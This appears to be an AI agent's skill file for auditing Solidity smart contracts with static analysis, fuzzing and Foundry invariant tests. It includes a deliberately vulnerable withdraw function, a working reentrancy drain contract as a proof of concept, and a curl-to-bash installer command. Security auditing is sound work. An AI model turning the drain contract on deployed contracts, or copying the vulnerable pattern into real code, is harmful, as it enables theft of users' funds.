---
name: blockchain-security
description: Smart contract security — reentrancy, overflow, access control, flash loans (Slither, Mythril, Echidna)
allowed-tools: [Bash, Read, Write]
---

# Blockchain / Smart Contract Security

## Tools

| Tool | Purpose |
|------|---------|
| slither | Static analysis for Solidity |
| mythril | Symbolic execution — finds reentrancy, overflow, etc. |
| echidna | Property-based fuzzer for Solidity |
| foundry (forge) | Testing framework with fuzz capabilities |
| solc | Solidity compiler |

## Static Analysis

```bash
# Slither — comprehensive static analysis
slither . --json OUTPUT_DIR/logs/slither.json 2>/dev/null
slither . --print human-summary 2>/dev/null | tee OUTPUT_DIR/logs/slither-summary.txt
slither . --detect reentrancy-eth,reentrancy-no-eth,unchecked-transfer,arbitrary-send \
  2>/dev/null | tee OUTPUT_DIR/logs/slither-critical.txt

# Mythril — symbolic execution
myth analyze contracts/Target.sol --json > OUTPUT_DIR/logs/mythril.json 2>/dev/null
myth analyze contracts/Target.sol -t 3 | tee OUTPUT_DIR/logs/mythril.txt
```

## Common Vulnerabilities to Check

### Reentrancy (CWE-841)

```solidity
// Vulnerable pattern:
function withdraw() public {
    uint amount = balances[msg.sender];
    (bool success,) = msg.sender.call{value: amount}("");  // External call BEFORE state update
    balances[msg.sender] = 0;  // State update AFTER call — reentrancy possible
}
```

```bash
# Slither detects this
grep -i "reentrancy" OUTPUT_DIR/logs/slither-critical.txt
```

### Integer Overflow/Underflow

```bash
# Check Solidity version — <0.8.0 lacks built-in overflow protection
grep "pragma solidity" contracts/*.sol
# If <0.8.0 without SafeMath: check all arithmetic
```

### Access Control

```bash
# Check for missing access control on sensitive functions
grep -n "onlyOwner\|require(msg.sender" contracts/*.sol
grep -n "function.*public\|function.*external" contracts/*.sol | grep -v "view\|pure"
```

### Flash Loan Attacks

Look for: price oracle manipulation, single-block arbitrage opportunities, lack of reentrancy guards on state-changing functions.

## Fuzzing with Echidna

```bash
# echidna-test requires a test contract
cat > /tmp/TestTarget.sol <<'EOF'
contract TestTarget {
    Target target;
    constructor() { target = new Target(); }
    
    // Invariant: balance should never go negative
    function echidna_balance_positive() public returns (bool) {
        return address(target).balance >= 0;
    }
}
EOF

echidna-test /tmp/TestTarget.sol --contract TestTarget \
  --config /tmp/echidna.yaml > OUTPUT_DIR/logs/echidna.txt 2>&1
```

## Foundry Invariant Testing & PoC Confirmation

Foundry is the most developer-aligned approach — write invariant tests in Solidity, run against a mainnet fork, confirm exploitability.

```bash
# Install Foundry if needed
curl -L https://foundry.paradigm.xyz | bash && foundryup

# Initialize project (if not already a Foundry project)
forge init --no-git "$OUTPUT_DIR/tools/foundry-poc/"
cd "$OUTPUT_DIR/tools/foundry-poc/"

# Fork mainnet / testnet for realistic state
# Set RPC in foundry.toml or via flag
cat >> foundry.toml << 'EOF'
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
fuzz = { runs = 10000 }
invariant = { runs = 256, depth = 128 }
EOF
```

### Invariant Test Template

```solidity
// test/InvariantTarget.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Target.sol";

contract InvariantTargetTest is Test {
    Target target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at specific block for reproducibility
        // vm.createSelectFork("mainnet", BLOCK_NUMBER);
        target = new Target();
        vm.deal(attacker, 100 ether);
    }

    // Invariant: total supply should never exceed max
    function invariant_totalSupplyNeverExceedsMax() public {
        assertLe(target.totalSupply(), target.MAX_SUPPLY());
    }

    // Invariant: contract balance should match tracked balances
    function invariant_contractBalanceMatchesTracked() public {
        assertEq(address(target).balance, target.totalDeposited());
    }

    // Invariant: no single user should own more than 50% of supply
    function invariant_noWhaleMonopoly() public {
        for (uint i = 0; i < 5; i++) {
            address user = address(uint160(i + 1));
            assertLe(target.balanceOf(user), target.totalSupply() / 2);
        }
    }
}
```

```bash
# Run invariant tests against fork
forge test --match-contract InvariantTargetTest \
  --fork-url "https://mainnet.infura.io/v3/KEY" \
  -vvv 2>&1 | tee "$OUTPUT_DIR/logs/forge-invariant.txt"

# Coverage report
forge coverage --report lcov 2>&1 | tee "$OUTPUT_DIR/logs/forge-coverage.txt"
genhtml lcov.info --output-directory "$OUTPUT_DIR/artifacts/coverage-report/"
```

### PoC Exploit Confirmation

```solidity
// test/ReentrancyPoC.t.sol
contract ReentrancyPoC is Test {
    Target victim;
    AttackerContract attacker;

    function setUp() public {
        victim  = new Target();
        attacker = new AttackerContract(address(victim));
        // Seed victim with ETH
        vm.deal(address(victim), 10 ether);
        // Give attacker initial deposit
        vm.deal(address(attacker), 1 ether);
    }

    function test_reentrancyDrain() public {
        uint victimBefore = address(victim).balance;
        attacker.attack{value: 1 ether}();
        uint victimAfter = address(victim).balance;
        // Assert victim was drained
        assertLt(victimAfter, victimBefore, "Reentrancy attack did not drain funds");
        console.log("Drained:", victimBefore - victimAfter);
    }
}

contract AttackerContract {
    Target victim;
    constructor(address _victim) { victim = Target(_victim); }
    
    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }
    
    receive() external payable {
        if (address(victim).balance >= 1 ether) victim.withdraw(); // reenter
    }
}
```

```bash
forge test --match-test test_reentrancyDrain -vvvv \
  2>&1 | tee "$OUTPUT_DIR/logs/forge-poc.txt"
```

## Output

```json
{
  "contract": "contracts/Target.sol",
  "findings": [
    {
      "type": "Reentrancy",
      "severity": "Critical",
      "function": "withdraw()",
      "line": 42,
      "description": "External call before state update",
      "cwe": "CWE-841",
      "remediation": "Use checks-effects-interactions pattern or ReentrancyGuard"
    }
  ]
}
```

Save to: `OUTPUT_DIR/findings/finding-NNN/`
Raw tool output: `OUTPUT_DIR/logs/`

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/web3-audit.md` — Smart contract security audit…
